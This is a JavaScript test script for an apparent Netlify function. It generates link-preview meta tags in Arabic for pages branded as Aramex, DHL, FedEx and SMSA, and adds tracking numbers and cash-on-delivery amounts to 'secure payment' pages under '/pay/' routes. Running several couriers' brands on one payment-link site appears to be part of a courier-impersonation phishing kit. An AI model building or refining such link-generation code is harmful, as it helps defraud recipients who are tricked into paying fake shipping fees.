// Test script for Netlify function logic
// This simulates the function behavior locally

const serviceData = {
  aramex: {
    name: "أرامكس - Aramex",
    description: "شركة رائدة في خدمات الشحن السريع والحلول اللوجستية في المنطقة",
    ogImage: "/og-aramex.jpg"
  },
  dhl: {
    name: "دي إتش إل - DHL", 
    description: "شبكة شحن عالمية توفر خدمات التوصيل السريع الدولي والمحلي",
    ogImage: "/og-dhl.jpg"
  },
  fedex: {
    name: "فيديكس - FedEx",
    description: "خدمات شحن دولية موثوقة مع تتبع فوري للشحنات", 
    ogImage: "/og-fedex.jpg"
  },
  smsa: {
    name: "سمسا - SMSA",
    description: "أكبر شركة شحن سعودية متخصصة في التوصيل السريع والخدمات اللوجستية",
    ogImage: "/og-smsa.jpg"
  }
};

// Simulate link data that might come from database
const mockLinkData = {
  id: "nfp_8cxH5fVQz22FxSJvkdfHJCbp12mGKxuJ6e44",
  type: "shipping",
  country_code: "SA",
  payload: {
    service_key: "dhl", // This is what should be extracted
    service_name: "دي إتش إل - DHL",
    tracking_number: "1234567890",
    cod_amount: 150,
    package_description: "ملابس"
  }
};

function testMetaTagGeneration(linkData, path, queryParams = {}) {
  console.log("=== Testing Meta Tag Generation ===");
  console.log("Link ID:", linkData.id);
  console.log("Path:", path);
  console.log("Query Params:", queryParams);
  
  // Determine service key from multiple sources
  let serviceKey = 'aramex'; // fallback
  
  if (linkData?.payload?.service_key) {
    serviceKey = linkData.payload.service_key;
    console.log('Using service_key from payload:', serviceKey);
  } else if (linkData?.payload?.service) {
    serviceKey = linkData.payload.service;
    console.log('Using service from payload:', serviceKey);
  } else if (queryParams?.service) {
    serviceKey = queryParams.service;
    console.log('Using service from query params:', serviceKey);
  } else {
    console.log('Using fallback service:', serviceKey);
  }
  
  const serviceInfo = serviceData[serviceKey] || serviceData.aramex;
  const serviceName = linkData?.payload?.service_name || serviceInfo.name;
  
  console.log('Final service info:', { serviceKey, serviceName, serviceInfo });
  
  // Determine if this is a payment page or microsite
  const isPaymentPage = path.startsWith('/pay/');
  const pageType = isPaymentPage ? 'صفحة دفع آمنة' : 'تتبع وتأكيد الدفع';
  
  let title = `${pageType} - ${serviceName}`;
  let description = `${serviceInfo.description} - ${isPaymentPage ? 'أكمل الدفع بشكل آمن ومحمي' : 'تتبع شحنتك وأكمل الدفع بشكل آمن'}`;
  let ogImage = serviceInfo.ogImage;
  
  // Add tracking number to description if available
  if (linkData?.payload?.tracking_number) {
    description += ` - رقم الشحنة: ${linkData.payload.tracking_number}`;
  }
  
  // Add COD amount if available
  if (linkData?.payload?.cod_amount && linkData.payload.cod_amount > 0) {
    description += ` - مبلغ الدفع: ${linkData.payload.cod_amount} ر.س`;
  }
  
  console.log("=== Generated Meta Tags ===");
  console.log("Title:", title);
  console.log("Description:", description);
  console.log("OG Image:", ogImage);
  console.log("Service Key:", serviceKey);
  
  return { title, description, ogImage, serviceKey };
}

// Test different scenarios
console.log("Testing with mock DHL link data...\n");
testMetaTagGeneration(mockLinkData, "/r/SA/shipping/nfp_8cxH5fVQz22FxSJvkdfHJCbp12mGKxuJ6e44");

console.log("\n" + "=".repeat(50) + "\n");

console.log("Testing payment page route...\n");
testMetaTagGeneration(mockLinkData, "/pay/nfp_8cxH5fVQz22FxSJvkdfHJCbp12mGKxuJ6e44/recipient");

console.log("\n" + "=".repeat(50) + "\n");

console.log("Testing with query parameter override...\n");
testMetaTagGeneration(mockLinkData, "/r/SA/shipping/nfp_8cxH5fVQz22FxSJvkdfHJCbp12mGKxuJ6e44", { service: "fedex" });

console.log("\n" + "=".repeat(50) + "\n");

console.log("Testing with missing service data (fallback)...\n");
const mockLinkDataNoService = {
  id: "nfp_8cxH5fVQz22FxSJvkdfHJCbp12mGKxuJ6e44",
  type: "shipping",
  country_code: "SA",
  payload: {
    // No service information
    tracking_number: "1234567890",
    cod_amount: 150
  }
};
testMetaTagGeneration(mockLinkDataNoService, "/r/SA/shipping/nfp_8cxH5fVQz22FxSJvkdfHJCbp12mGKxuJ6e44");